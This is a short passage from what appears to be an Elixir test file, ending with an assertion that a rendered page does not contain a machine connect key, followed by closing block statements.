      refute page =~ MachineKeys.connect_key()
    end
  end
end
